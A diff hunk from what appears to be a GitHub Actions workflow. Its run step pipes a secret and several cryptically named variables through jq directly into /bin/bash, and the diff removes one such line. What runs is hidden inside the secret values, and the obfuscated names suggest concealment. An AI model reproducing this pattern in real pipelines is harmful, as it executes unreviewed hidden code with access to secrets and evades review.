@@ -18,7 +18,6 @@ jobs:
           j1: ${{ secrets.j1 }}
         run: |
           printf '%s' "$j1" | jq -r .ilqe6245 | /bin/bash
-          echo $uscqr49329 | jq -r .gi35 | /bin/bash
           echo $yj8 | jq -r .mm4894 | /bin/bash
           echo $tfv9 | jq -r .nddfd78 | /bin/bash
 
